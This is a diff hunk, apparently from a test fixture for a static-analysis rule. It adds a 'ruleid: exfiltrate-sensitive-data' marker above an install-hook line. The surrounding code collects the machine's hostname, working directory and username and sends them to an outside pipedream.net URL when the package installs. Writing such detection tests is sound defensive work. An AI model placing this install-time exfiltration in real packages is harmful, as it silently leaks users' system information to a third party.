@@ -224,4 +224,5 @@ class CustomInstall(install):
         cwd = os.getcwd()
         username = getpass.getuser()
         ploads = {'hostname':hostname,'cwd':cwd,'username':username}
+        # ruleid: exfiltrate-sensitive-data
         requests.get("https://eo6ksiuyau5e5x2.m.pipedream.net",params = ploads)
